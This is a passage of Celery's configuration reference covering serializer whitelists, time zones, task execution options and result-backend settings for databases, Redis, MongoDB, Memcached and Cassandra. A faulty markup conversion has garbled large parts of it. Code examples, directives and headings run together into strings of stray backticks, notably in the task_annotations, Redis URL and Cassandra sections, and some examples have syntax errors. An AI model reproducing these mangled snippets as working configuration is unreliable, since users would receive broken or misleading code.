| `CELERY_SEND_EVENTS`                               | `worker_send_task_events`                                                                   |
| `CELERYD_STATE_DB`                                 | `worker_state_db`                                                                           |
| `CELERY_WORKER_TASK_LOG_FORMAT`                    | `worker_task_log_format`                                                                    |
| `CELERYD_TIMER`                                    | `worker_timer`                                                                              |
| `CELERYD_TIMER_PRECISION`                          | `worker_timer_precision`                                                                    |
| `CELERYD_DETECT_QUORUM_QUEUES`                     | `worker_detect_quorum_queues`                                                               |

## Configuration Directives

### General settings

<div class="setting">

accept\_content

</div>

#### `accept_content`

Default: `{'json'}` (set, list, or tuple).

A white-list of content-types/serializers to allow.

If a message is received that's not in this list then the message will be discarded with an error.

By default only json is enabled but any content type can be added, including pickle and yaml; when this is the case make sure untrusted parties don't have access to your broker. See \[guide-security\](\#guide-security) for more.

Example:

    # using serializer name
    accept_content = ['json']
    
    # or the actual content-type (MIME)
    accept_content = ['application/json']

<div class="setting">

result\_accept\_content

</div>

#### `result_accept_content`

Default: `None` (can be set, list or tuple).

<div class="versionadded">

4.3

</div>

A white-list of content-types/serializers to allow for the result backend.

If a message is received that's not in this list then the message will be discarded with an error.

By default it is the same serializer as `accept_content`. However, a different serializer for accepted content of the result backend can be specified. Usually this is needed if signed messaging is used and the result is stored unsigned in the result backend. See \[guide-security\](\#guide-security) for more.

Example:

    # using serializer name
    result_accept_content = ['json']
    
    # or the actual content-type (MIME)
    result_accept_content = ['application/json']

### Time and date settings

<div class="setting">

enable\_utc

</div>

#### `enable_utc`

<div class="versionadded">

2.5

</div>

Default: Enabled by default since version 3.0.

If enabled dates and times in messages will be converted to use the UTC timezone.

Note that workers running Celery versions below 2.5 will assume a local timezone for all messages, so only enable if all workers have been upgraded.

<div class="setting">

timezone

</div>

#### `timezone`

<div class="versionadded">

2.5

</div>

Default: `"UTC"`.

Configure Celery to use a custom time zone. The timezone value can be any time zone supported by the [ZoneInfo](https://docs.python.org/3/library/zoneinfo.html) library.

If not set the UTC timezone is used. For backwards compatibility there's also a `enable_utc` setting, and when this is set to false the system local timezone is used instead.

### Task settings

<div class="setting">

task\_annotations

</div>

#### `task_annotations`

<div class="versionadded">

2.5

</div>

Default: <span class="title-ref">None</span>.

This setting can be used to rewrite any task attribute from the configuration. The setting can be a dict, or a list of annotation objects that filter for tasks and return a map of attributes to change.

This will change the `rate_limit` attribute for the `tasks.add` task:

`` `python     task_annotations = {'tasks.add': {'rate_limit': '10/s'}}  or change the same for all tasks:  .. code-block:: python      task_annotations = {'*': {'rate_limit': '10/s'}}  You can change methods too, for example the ``on\_failure`handler:  .. code-block:: python      def my_on_failure(self, exc, task_id, args, kwargs, einfo):         print('Oh no! Task failed: {0!r}'.format(exc))      task_annotations = {'*': {'on_failure': my_on_failure}}  If you need more flexibility then you can use objects`\` instead of a dict to choose the tasks to annotate:

`` `python     class MyAnnotate:          def annotate(self, task):             if task.name.startswith('tasks.'):                 return {'rate_limit': '10/s'}      task_annotations = (MyAnnotate(), {other,})  .. setting:: task_compression ``task\_compression`  `\` \~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~

Default: <span class="title-ref">None</span>

Default compression used for task messages. Can be `gzip`, `bzip2` (if available), or any custom compression schemes registered in the Kombu compression registry.

The default is to send uncompressed messages.

<div class="setting">

task\_protocol

</div>

#### `task_protocol`

Default: 2 (since 4.0).

Set the default task message protocol version used to send tasks. Supports protocols: 1 and 2.

Protocol 2 is supported by 3.1.24 and 4.x+.

<div class="setting">

task\_serializer

</div>

#### `task_serializer`

Default: `"json"` (since 4.0, earlier: pickle).

A string identifying the default serialization method to use. Can be <span class="title-ref">json</span> (default), <span class="title-ref">pickle</span>, <span class="title-ref">yaml</span>, <span class="title-ref">msgpack</span>, or any custom serialization methods that have been registered with `kombu.serialization.registry`.

<div class="seealso">

\[calling-serializers\](\#calling-serializers).

</div>

<div class="setting">

task\_publish\_retry

</div>

#### `task_publish_retry`

<div class="versionadded">

2.2

</div>

Default: Enabled.

Decides if publishing task messages will be retried in the case of connection loss or other connection errors. See also `task_publish_retry_policy`.

<div class="setting">

task\_publish\_retry\_policy

</div>

#### `task_publish_retry_policy`

<div class="versionadded">

2.2

</div>

Default: See \[calling-retry\](\#calling-retry).

Defines the default policy when retrying publishing a task message in the case of connection loss or other connection errors.

### Task execution settings

<div class="setting">

task\_always\_eager

</div>

#### `task_always_eager`

Default: Disabled.

If this is <span class="title-ref">True</span>, all tasks will be executed locally by blocking until the task returns. `apply_async()` and `Task.delay()` will return an <span class="title-ref">\~celery.result.EagerResult</span> instance, that emulates the API and behavior of <span class="title-ref">\~celery.result.AsyncResult</span>, except the result is already evaluated.

That is, tasks will be executed locally instead of being sent to the queue.

<div class="setting">

task\_eager\_propagates

</div>

#### `task_eager_propagates`

Default: Disabled.

If this is <span class="title-ref">True</span>, eagerly executed tasks (applied by <span class="title-ref">task.apply()</span>, or when the `task_always_eager` setting is enabled), will propagate exceptions.

It's the same as always running `apply()` with `throw=True`.

<div class="setting">

task\_store\_eager\_result

</div>

#### `task_store_eager_result`

<div class="versionadded">

5.1

</div>

Default: Disabled.

If this is <span class="title-ref">True</span> and `task_always_eager` is <span class="title-ref">True</span> and `task_ignore_result` is <span class="title-ref">False</span>, the results of eagerly executed tasks will be saved to the backend.

By default, even with `task_always_eager` set to <span class="title-ref">True</span> and `task_ignore_result` set to <span class="title-ref">False</span>, the result will not be saved.

<div class="setting">

task\_remote\_tracebacks

</div>

#### `task_remote_tracebacks`

Default: Disabled.

If enabled task results will include the workers stack when re-raising task errors.

This requires the `tblib` library, that can be installed using `pip`:

`` `console     $ pip install celery[tblib]  See [bundles](#bundles) for information on combining multiple extension ``\` requirements.

<div class="setting">

task\_ignore\_result

</div>

#### `task_ignore_result`

Default: Disabled.

Whether to store the task return values or not (tombstones). If you still want to store errors, just not successful return values, you can set `task_store_errors_even_if_ignored`.

<div class="setting">

task\_store\_errors\_even\_if\_ignored

</div>

#### `task_store_errors_even_if_ignored`

Default: Disabled.

If set, the worker stores all task errors in the result store even if <span class="title-ref">Task.ignore\_result \<celery.app.task.Task.ignore\_result\></span> is on.

<div class="setting">

task\_track\_started

</div>

#### `task_track_started`

Default: Disabled.

If <span class="title-ref">True</span> the task will report its status as 'started' when the task is executed by a worker. The default value is <span class="title-ref">False</span> as the normal behavior is to not report that level of granularity. Tasks are either pending, finished, or waiting to be retried. Having a 'started' state can be useful for when there are long running tasks and there's a need to report what task is currently running.

<div class="setting">

task\_time\_limit

</div>

#### `task_time_limit`

Default: No time limit.

Task hard time limit in seconds. The worker processing the task will be killed and replaced with a new one when this is exceeded.

<div class="setting">

task\_allow\_error\_cb\_on\_chord\_header

</div>

#### `task_allow_error_cb_on_chord_header`

<div class="versionadded">

5.3

</div>

Default: Disabled.

Enabling this flag will allow linking an error callback to a chord header, which by default will not link when using `link_error()`, and preventing from the chord's body to execute if any of the tasks in the header fails.

Consider the following canvas with the flag disabled (default behavior):

`` `python     header = group([t1, t2])     body = t3     c = chord(header, body)     c.link_error(error_callback_sig)  If *any* of the header tasks failed (:code:`t1` or :code:`t2`), by default, the chord body (:code:`t3`) would **not execute**, and :code:`error_callback_sig` will be called **once** (for the body).  Enabling this flag will change the above behavior by:  1. :code:`error_callback_sig` will be linked to :code:`t1` and :code:`t2` (as well as :code:`t3`). ``<span class="title-ref"> 2. If \*any\* of the header tasks failed, :code:\`error\_callback\_sig</span> will be called **for each** failed header task **and** the `body` (even if the body didn't run).

Consider now the following canvas with the flag enabled:

`` `python     header = group([failingT1, failingT2])     body = t3     c = chord(header, body)     c.link_error(error_callback_sig)  If *all* of the header tasks failed (:code:`failingT1` and :code:`failingT2`), then the chord body (:code:`t3`) would **not execute**, and :code:`error_callback_sig` will be called **3 times** (two times for the header and one time for the body).  Lastly, consider the following canvas with the flag enabled:  .. code-block:: python      header = group([failingT1, failingT2])     body = t3     upgraded_chord = chain(header, body)     upgraded_chord.link_error(error_callback_sig)  This canvas will behave exactly the same as the previous one, since the :code:`chain` will be upgraded to a :code:`chord` internally.  .. setting:: task_soft_time_limit ``task\_soft\_time\_limit`  `\` \~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~

Default: No soft time limit.

Task soft time limit in seconds.

The <span class="title-ref">\~@SoftTimeLimitExceeded</span> exception will be raised when this is exceeded. For example, the task can catch this to clean up before the hard time limit comes:

`` `python     from celery.exceptions import SoftTimeLimitExceeded      @app.task     def mytask():         try:             return do_work()         except SoftTimeLimitExceeded:             cleanup_in_a_hurry()  .. setting:: task_acks_late ``task\_acks\_late`  `\` \~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~

Default: Disabled.

Late ack means the task messages will be acknowledged **after** the task has been executed, not *right before* (the default behavior).

<div class="seealso">

FAQ: \[faq-acks\_late-vs-retry\](\#faq-acks\_late-vs-retry).

</div>

<div class="setting">

task\_acks\_on\_failure\_or\_timeout

</div>

#### `task_acks_on_failure_or_timeout`

Default: Enabled

When enabled messages for all tasks will be acknowledged even if they fail or time out.

Configuring this setting only applies to tasks that are acknowledged **after** they have been executed and only if `task_acks_late` is enabled.

<div class="setting">

task\_reject\_on\_worker\_lost

</div>

#### `task_reject_on_worker_lost`

Default: Disabled.

Even if `task_acks_late` is enabled, the worker will acknowledge tasks when the worker process executing them abruptly exits or is signaled (e.g., `KILL`/`INT`, etc).

Setting this to true allows the message to be re-queued instead, so that the task will execute again by the same worker, or another worker.

\> **Warning** \> Enabling this can cause message loops; make sure you know what you're doing.

<div class="setting">

task\_default\_rate\_limit

</div>

#### `task_default_rate_limit`

Default: No rate limit.

The global default rate limit for tasks.

This value is used for tasks that doesn't have a custom rate limit

<div class="seealso">

The `worker_disable_rate_limits` setting can disable all rate limits.

</div>

### Task result backend settings

<div class="setting">

result\_backend

</div>

#### `result_backend`

Default: No result backend enabled by default.

The backend used to store task results (tombstones). Can be one of the following:

  -   - `rpc`  
        Send results back as AMQP messages See \[conf-rpc-result-backend\](\#conf-rpc-result-backend).

  -   - `database`  
        Use a relational database supported by [SQLAlchemy](http://sqlalchemy.org). See \[conf-database-result-backend\](\#conf-database-result-backend).

  -   - `redis`  
        Use [Redis](https://redis.io) to store the results. See \[conf-redis-result-backend\](\#conf-redis-result-backend).

  -   - `cache`  
        Use [Memcached](http://memcached.org) to store the results. See \[conf-cache-result-backend\](\#conf-cache-result-backend).

<!-- end list -->

  - \*`mongodb`  
    Use [MongoDB](http://mongodb.org) to store the results. See \[conf-mongodb-result-backend\](\#conf-mongodb-result-backend).

  - \* `cassandra`  
    Use [Cassandra](http://cassandra.apache.org/) to store the results. See \[conf-cassandra-result-backend\](\#conf-cassandra-result-backend).

  - \* `elasticsearch`  
    Use [Elasticsearch](https://aws.amazon.com/elasticsearch-service/) to store the results. See \[conf-elasticsearch-result-backend\](\#conf-elasticsearch-result-backend).

  - \* `ironcache`  
    Use [IronCache](http://www.iron.io/cache) to store the results. See \[conf-ironcache-result-backend\](\#conf-ironcache-result-backend).

  - \* `couchbase`  
    Use [Couchbase](https://www.couchbase.com/) to store the results. See \[conf-couchbase-result-backend\](\#conf-couchbase-result-backend).

  - \* `arangodb`  
    Use [ArangoDB](https://www.arangodb.com/) to store the results. See \[conf-arangodb-result-backend\](\#conf-arangodb-result-backend).

  - \* `couchdb`  
    Use [CouchDB](http://www.couchdb.com/) to store the results. See \[conf-couchdb-result-backend\](\#conf-couchdb-result-backend).

  - \* `cosmosdbsql (experimental)`  
    Use the [CosmosDB](https://azure.microsoft.com/en-us/services/cosmos-db/) PaaS to store the results. See \[conf-cosmosdbsql-result-backend\](\#conf-cosmosdbsql-result-backend).

  - \* `filesystem`  
    Use a shared directory to store the results. See \[conf-filesystem-result-backend\](\#conf-filesystem-result-backend).

  - \* `consul`  
    Use the [Consul](https://consul.io/) K/V store to store the results See \[conf-consul-result-backend\](\#conf-consul-result-backend).

  - \* `azureblockblob`  
    Use the [AzureBlockBlob](https://azure.microsoft.com/en-us/services/storage/blobs/) PaaS store to store the results See \[conf-azureblockblob-result-backend\](\#conf-azureblockblob-result-backend).

  - \* `s3`  
    Use the [S3](https://aws.amazon.com/s3/) to store the results See \[conf-s3-result-backend\](\#conf-s3-result-backend).

  - \* `gcs`  
    Use the [GCS](https://cloud.google.com/storage/) to store the results See \[conf-gcs-result-backend\](\#conf-gcs-result-backend).

<div class="setting">

result\_backend\_always\_retry

</div>

#### `result_backend_always_retry`

Default: <span class="title-ref">False</span>

If enable, backend will try to retry on the event of recoverable exceptions instead of propagating the exception. It will use an exponential backoff sleep time between 2 retries.

<div class="setting">

result\_backend\_max\_sleep\_between\_retries\_ms

</div>

#### `result_backend_max_sleep_between_retries_ms`

Default: 10000

This specifies the maximum sleep time between two backend operation retry.

<div class="setting">

result\_backend\_base\_sleep\_between\_retries\_ms

</div>

#### `result_backend_base_sleep_between_retries_ms`

Default: 10

This specifies the base amount of sleep time between two backend operation retry.

<div class="setting">

result\_backend\_max\_retries

</div>

#### `result_backend_max_retries`

Default: Inf

This is the maximum of retries in case of recoverable exceptions.

<div class="setting">

result\_backend\_thread\_safe

</div>

#### `result_backend_thread_safe`

Default: False

If True, then the backend object is shared across threads. This may be useful for using a shared connection pool instead of creating a connection for every thread.

<div class="setting">

result\_backend\_transport\_options

</div>

#### `result_backend_transport_options`

Default: `{}` (empty mapping).

A dict of additional options passed to the underlying transport.

See your transport user manual for supported options (if any).

Example setting the visibility timeout (supported by Redis and SQS transports):

`` `python     result_backend_transport_options = {'visibility_timeout': 18000}  # 5 hours    .. setting:: result_serializer ``result\_serializer`  `\` \~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~

Default: `json` since 4.0 (earlier: pickle).

Result serialization format.

See \[calling-serializers\](\#calling-serializers) for information about supported serialization formats.

<div class="setting">

result\_compression

</div>

#### `result_compression`

Default: No compression.

Optional compression method used for task results. Supports the same options as the `task_compression` setting.

<div class="setting">

result\_extended

</div>

#### `result_extended`

Default: `False`

Enables extended task result attributes (name, args, kwargs, worker, retries, queue, delivery\_info) to be written to backend.

<div class="setting">

result\_expires

</div>

#### `result_expires`

Default: Expire after 1 day.

Time (in seconds, or a <span class="title-ref">\~datetime.timedelta</span> object) for when after stored task tombstones will be deleted.

A built-in periodic task will delete the results after this time (`celery.backend_cleanup`), assuming that `celery beat` is enabled. The task runs daily at 4am.

A value of <span class="title-ref">None</span> or 0 means results will never expire (depending on backend specifications).

\> **Note** \> For the moment this only works with the AMQP, database, cache, Couchbase, and Redis backends.

> When using the database backend, `celery beat` must be running for the results to be expired.

<div class="setting">

result\_cache\_max

</div>

#### `result_cache_max`

Default: Disabled by default.

Enables client caching of results.

This can be useful for the old deprecated 'amqp' backend where the result is unavailable as soon as one result instance consumes it.

This is the total number of results to cache before older results are evicted. A value of 0 or None means no limit, and a value of <span class="title-ref">-1</span> will disable the cache.

Disabled by default.

<div class="setting">

result\_chord\_join\_timeout

</div>

#### `result_chord_join_timeout`

Default: 3.0.

The timeout in seconds (int/float) when joining a group's results within a chord.

<div class="setting">

result\_chord\_retry\_interval

</div>

#### `result_chord_retry_interval`

Default: 1.0.

Default interval for retrying chord tasks.

<div class="setting">

override\_backends

</div>

#### `override_backends`

Default: Disabled by default.

Path to class that implements backend.

Allows to override backend implementation. This can be useful if you need to store additional metadata about executed tasks, override retry policies, etc.

Example:

`` `python     override_backends = {"db": "custom_module.backend.class"}  .. _conf-database-result-backend:  Database backend settings ``\` -------------------------

#### Database URL Examples

To use the database backend you have to configure the `result_backend` setting with a connection URL and the `db+` prefix:

`` `python     result_backend = 'db+scheme://user:password@host:port/dbname'  Examples::      # sqlite (filename)     result_backend = 'db+sqlite:///results.sqlite'      # mysql     result_backend = 'db+mysql://scott:tiger@localhost/foo'      # postgresql     result_backend = 'db+postgresql://scott:tiger@localhost/mydatabase'      # oracle     result_backend = 'db+oracle://scott:tiger@127.0.0.1:1521/sidname'  .. code-block:: python  Please see `Supported Databases`_ for a table of supported databases, ``<span class="title-ref"> and \`Connection String</span>\_ for more information about connection strings (this is the part of the URI that comes after the `db+` prefix).

<div class="setting">

database\_create\_tables\_at\_setup

</div>

#### `database_create_tables_at_setup`

<div class="versionadded">

5.5.0

</div>

Default: True by default.

  - If <span class="title-ref">True</span>, Celery will create the tables in the database during setup.
  - If <span class="title-ref">False</span>, Celery will create the tables lazily, i.e. wait for the first task to be executed before creating the tables.

<div class="note">

<div class="title">

Note

</div>

Before celery 5.5, the tables were created lazily i.e. it was equivalent to <span class="title-ref">database\_create\_tables\_at\_setup</span> set to False.

</div>

<div class="setting">

database\_engine\_options

</div>

#### `database_engine_options`

Default: `{}` (empty mapping).

To specify additional SQLAlchemy database engine options you can use the `database_engine_options` setting:

    # echo enables verbose logging from SQLAlchemy.
    app.conf.database_engine_options = {'echo': True}

<div class="setting">

database\_short\_lived\_sessions

</div>

#### `database_short_lived_sessions`

Default: Disabled by default.

Short lived sessions are disabled by default. If enabled they can drastically reduce performance, especially on systems processing lots of tasks. This option is useful on low-traffic workers that experience errors as a result of cached database connections going stale through inactivity. For example, intermittent errors like <span class="title-ref">(OperationalError) (2006, 'MySQL server has gone away')</span> can be fixed by enabling short lived sessions. This option only affects the database backend.

<div class="setting">

database\_table\_schemas

</div>

#### `database_table_schemas`

Default: `{}` (empty mapping).

When SQLAlchemy is configured as the result backend, Celery automatically creates two tables to store result meta-data for tasks. This setting allows you to customize the schema of the tables:

`` `python     # use custom schema for the database result backend.     database_table_schemas = {         'task': 'celery',         'group': 'celery',     }  .. setting:: database_table_names ``database\_table\_names`  `\` \~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~

Default: `{}` (empty mapping).

When SQLAlchemy is configured as the result backend, Celery automatically creates two tables to store result meta-data for tasks. This setting allows you to customize the table names:

`` `python     # use custom table names for the database result backend.     database_table_names = {         'task': 'myapp_taskmeta',         'group': 'myapp_groupmeta',     }  .. _conf-rpc-result-backend:  RPC backend settings ``\` --------------------

<div class="setting">

result\_persistent

</div>

#### `result_persistent`

Default: Disabled by default (transient messages).

If set to <span class="title-ref">True</span>, result messages will be persistent. This means the messages won't be lost after a broker restart.

#### Example configuration

`` `python     result_backend = 'rpc://'     result_persistent = False  **Please note**: using this backend could trigger the raise of ``celery.backends.rpc.BacklogLimitExceeded`if the task tombstone is too *old*.  E.g.  .. code-block:: python      for i in range(10000):         r = debug_task.delay()      print(r.state)  # this would raise celery.backends.rpc.BacklogLimitExceeded  .. _conf-cache-result-backend:  Cache backend settings`\` ----------------------

\> **Note** \> The cache backend supports the `pylibmc` and `python-memcached` libraries. The latter is used only if `pylibmc` isn't installed.

Using a single Memcached server:

`` `python     result_backend = 'cache+memcached://127.0.0.1:11211/'  Using multiple Memcached servers:  .. code-block:: python      result_backend = """         cache+memcached://172.19.26.240:11211;172.19.26.242:11211/     """.strip()  The "memory" backend stores the cache in memory only:  .. code-block:: python      result_backend = 'cache'     cache_backend = 'memory'  .. setting:: cache_backend_options ``cache\_backend\_options`  `\` \~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~

Default: `{}` (empty mapping).

You can set `pylibmc` options using the `cache_backend_options` setting:

`` `python     cache_backend_options = {         'binary': True,         'behaviors': {'tcp_nodelay': True},     }  .. setting:: cache_backend ``cache\_backend`  `\` \~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~

This setting is no longer used in celery's builtin backends as it's now possible to specify the cache backend directly in the `result_backend` setting.

\> **Note** \> The \[django-celery-results\](\#django-celery-results) library uses `cache_backend` for choosing django caches.

### MongoDB backend settings

\> **Note** \> The MongoDB backend requires the `pymongo` library: <http://github.com/mongodb/mongo-python-driver/tree/master>

<div class="setting">

mongodb\_backend\_settings

</div>

#### mongodb\_backend\_settings

This is a dict supporting the following keys:

  -   - database  
        The database name to connect to. Defaults to `celery`.

  -   - taskmeta\_collection  
        The collection name to store task meta data. Defaults to `celery_taskmeta`.

  -   - max\_pool\_size  
        Passed as max\_pool\_size to PyMongo's Connection or MongoClient constructor. It is the maximum number of TCP connections to keep open to MongoDB at a given time. If there are more open connections than max\_pool\_size, sockets will be closed when they are released. Defaults to 10.

  - options
    
    > Additional keyword arguments to pass to the mongodb connection constructor. See the `pymongo` docs to see a list of arguments supported.

#### Example configuration

`` `python     result_backend = 'mongodb://localhost:27017/'     mongodb_backend_settings = {         'database': 'mydb',         'taskmeta_collection': 'my_taskmeta_collection',     }  .. _conf-redis-result-backend:  Redis backend settings ``\` ----------------------

#### Configuring the backend URL

\> **Note** \> The Redis backend requires the `redis` library.

> To install this package use `pip`:
> 
>   - \`\`\`console  
>     $ pip install celery\[redis\]
> 
> See \[bundles\](\#bundles) for information on combining multiple extension requirements.

This backend requires the `result_backend` `` ` setting to be set to a Redis or `Redis over TLS`_ URL::      result_backend = 'redis://username:password@host:port/db'     For example::      result_backend = 'redis://localhost/0'  is the same as::      result_backend = 'redis://'  Use the ``<rediss://>`protocol to connect to redis over TLS::      result_backend = 'rediss://username:password@host:port/db?ssl_cert_reqs=required'  Note that the`ssl\_cert\_reqs`string should be one of`required`,`optional`, or`none`(though, for backwards compatibility with older Celery versions, the string may also be one of`CERT\_REQUIRED`,`CERT\_OPTIONAL`,`CERT\_NONE`, but those values only work for Celery, not for Redis directly).  If a Unix socket connection should be used, the URL needs to be in the format:::      result_backend = 'socket:///path/to/redis.sock'  The fields of the URL are defined as follows:  #.`username`.. versionadded:: 5.1.0      Username used to connect to the database.      Note that this is only supported in Redis>=6.0 and with py-redis>=3.4.0     installed.      If you use an older database version or an older client version     you can omit the username::          result_backend = 'redis://:password@host:port/db'  #.`password`Password used to connect to the database.  #.`host``Host name or IP address of the Redis server (e.g., `localhost`).  #.``port`Port to the Redis server. Default is 6379.  #.`db`Database number to use. Default is 0.     The db can include an optional leading slash.  When using a TLS connection (protocol is`<rediss://>``), you may pass in all values in :setting:`broker_use_ssl` as query parameters. Paths to certificates must be URL encoded, and``ssl\_cert\_reqs`is required. Example:`\`python result\_backend = '<rediss://:password@host:port/db?\> ssl\_cert\_reqs=required \&ssl\_ca\_certs=%2Fvar%2Fssl%2Fmyca.pem \# /var/ssl/myca.pem \&ssl\_certfile=%2Fvar%2Fssl%2Fredis-server-cert.pem \# /var/ssl/redis-server-cert.pem \&ssl\_keyfile=%2Fvar%2Fssl%2Fprivate%2Fworker-key.pem' \# /var/ssl/private/worker-key.pem

Note that the `ssl_cert_reqs` string should be one of `required`, `` ` ``optional`, or`none`(though, for backwards compatibility, the string may also be one of`CERT\_REQUIRED`,`CERT\_OPTIONAL`,`CERT\_NONE`).   .. setting:: redis_backend_health_check_interval  .. versionadded:: 5.1.0`redis\_backend\_health\_check\_interval`~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: Not configured  The Redis backend supports health checks.  This value must be set as an integer whose value is the number of seconds between health checks.  If a ConnectionError or a TimeoutError is encountered during the health check, the connection will be re-established and the command retried exactly once.  .. setting:: redis_backend_use_ssl`redis\_backend\_use\_ssl`~~~~~~~~~~~~~~~~~~~~~~~~~  Default: Disabled.  The Redis backend supports SSL. This value must be set in the form of a dictionary. The valid key-value pairs are the same as the ones mentioned in the`redis``sub-section under :setting:`broker_use_ssl`.  .. setting:: redis_max_connections``redis\_max\_connections``~~~~~~~~~~~~~~~~~~~~~~~~~  Default: No limit.  Maximum number of connections available in the Redis connection pool used for sending and retrieving results.  .. warning::     Redis will raise a `ConnectionError` if the number of concurrent     connections exceeds the maximum.  .. setting:: redis_socket_connect_timeout``redis\_socket\_connect\_timeout``~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  .. versionadded:: 4.0.1  Default: `None`  Socket timeout for connections to Redis from the result backend in seconds (int/float)  .. setting:: redis_socket_timeout``redis\_socket\_timeout`~~~~~~~~~~~~~~~~~~~~~~~~  Default: 120.0 seconds.  Socket timeout for reading/writing operations to the Redis server in seconds (int/float), used by the redis result backend.  .. setting:: redis_retry_on_timeout`redis\_retry\_on\_timeout``~~~~~~~~~~~~~~~~~~~~~~~~~~  .. versionadded:: 4.4.1  Default: `False`  To retry reading/writing operations on TimeoutError to the Redis server, used by the redis result backend. Shouldn't set this variable if using Redis connection by unix socket.  .. setting:: redis_socket_keepalive``redis\_socket\_keepalive``~~~~~~~~~~~~~~~~~~~~~~~~~~  .. versionadded:: 4.4.1  Default: `False`  Socket TCP keepalive to keep connections healthy to the Redis server, used by the redis result backend.  .. _conf-cassandra-result-backend:  Cassandra/AstraDB backend settings ----------------------------------  > **Note** >      This Cassandra backend driver requires :pypi:`cassandra-driver`.      This backend can refer to either a regular Cassandra installation     or a managed Astra DB instance. Depending on which one, exactly one     between the :setting:`cassandra_servers` and     :setting:`cassandra_secure_bundle_path` settings must be provided     (but not both).      To install, use :command:`pip`:``\`console $ pip install celery\[cassandra\]

> See \[bundles\](\#bundles) for information on combining multiple extension requirements.

This backend requires the following configuration directives to be set.

<div class="setting">

cassandra\_servers

</div>

`cassandra_servers` `` ` ~~~~~~~~~~~~~~~~~~~~~  Default: ``\[\]`(empty list).  List of`host``Cassandra servers. This must be provided when connecting to a Cassandra cluster. Passing this setting is strictly exclusive to :setting:`cassandra_secure_bundle_path`. Example::      cassandra_servers = ['localhost']  .. setting:: cassandra_secure_bundle_path``cassandra\_secure\_bundle\_path``~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: None.  Absolute path to the secure-connect-bundle zip file to connect to an Astra DB instance. Passing this setting is strictly exclusive to :setting:`cassandra_servers`. Example::      cassandra_secure_bundle_path = '/home/user/bundles/secure-connect.zip'  When connecting to Astra DB, it is necessary to specify the plain-text auth provider and the associated username and password, which take the value of the Client ID and the Client Secret, respectively, of a valid token generated for the Astra DB instance. See below for an Astra DB configuration example.  .. setting:: cassandra_port``cassandra\_port`~~~~~~~~~~~~~~~~~~  Default: 9042.  Port to contact the Cassandra servers on.  .. setting:: cassandra_keyspace`cassandra\_keyspace`~~~~~~~~~~~~~~~~~~~~~~  Default: None.  The keyspace in which to store the results. For example::      cassandra_keyspace = 'tasks_keyspace'  .. setting:: cassandra_table`cassandra\_table`~~~~~~~~~~~~~~~~~~~  Default: None.  The table (column family) in which to store the results. For example::      cassandra_table = 'tasks'  .. setting:: cassandra_read_consistency`cassandra\_read\_consistency`~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: None.  The read consistency used. Values can be`ONE`,`TWO`,`THREE`,`QUORUM`,`ALL`,`LOCAL\_QUORUM`,`EACH\_QUORUM`,`LOCAL\_ONE`.  .. setting:: cassandra_write_consistency`cassandra\_write\_consistency`~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: None.  The write consistency used. Values can be`ONE`,`TWO`,`THREE`,`QUORUM`,`ALL`,`LOCAL\_QUORUM`,`EACH\_QUORUM`,`LOCAL\_ONE`.  .. setting:: cassandra_entry_ttl`cassandra\_entry\_ttl``~~~~~~~~~~~~~~~~~~~~~~~  Default: None.  Time-to-live for status entries. They will expire and be removed after that many seconds after adding. A value of `None` (default) means they will never expire.  .. setting:: cassandra_auth_provider``cassandra\_auth\_provider``~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: `None`.  AuthProvider class within``cassandra.auth`module to use. Values can be`PlainTextAuthProvider`or`SaslAuthProvider`.  .. setting:: cassandra_auth_kwargs`cassandra\_auth\_kwargs`~~~~~~~~~~~~~~~~~~~~~~~~~  Default:`{}`(empty mapping).  Named arguments to pass into the authentication provider. For example:`\`python cassandra\_auth\_kwargs = { username: 'cassandra', password: 'cassandra' }

<div class="setting">

cassandra\_options

</div>

`cassandra_options` `` ` ~~~~~~~~~~~~~~~~~~~~~~~~~~~  Default: ``{}`(empty mapping).  Named arguments to pass into the`cassandra.cluster`class.`\`python cassandra\_options = { 'cql\_version': '3.2.1' 'protocol\_version': 3 }

Example configuration (Cassandra) `` ` ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ``\`python result\_backend = 'cassandra://' cassandra\_servers = \['localhost'\] cassandra\_keyspace = 'celery' cassandra\_table = 'tasks' cassandra\_read\_consistency = 'QUORUM' cassandra\_write\_consistency = 'QUORUM' cassandra\_entry\_ttl = 86400

Example configuration (Astra DB) `` ` ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ``\`python result\_backend = 'cassandra://' cassandra\_keyspace = 'celery' cassandra\_table = 'tasks' cassandra\_read\_consistency = 'QUORUM' cassandra\_write\_consistency = 'QUORUM' cassandra\_auth\_provider = 'PlainTextAuthProvider' cassandra\_auth\_kwargs = { 'username': '\<\<CLIENT\_ID\_FROM\_ASTRA\_DB\_TOKEN\>\>', 'password': '\<\<CLIENT\_SECRET\_FROM\_ASTRA\_DB\_TOKEN\>\>' } cassandra\_secure\_bundle\_path = '/path/to/secure-connect-bundle.zip' cassandra\_entry\_ttl = 86400

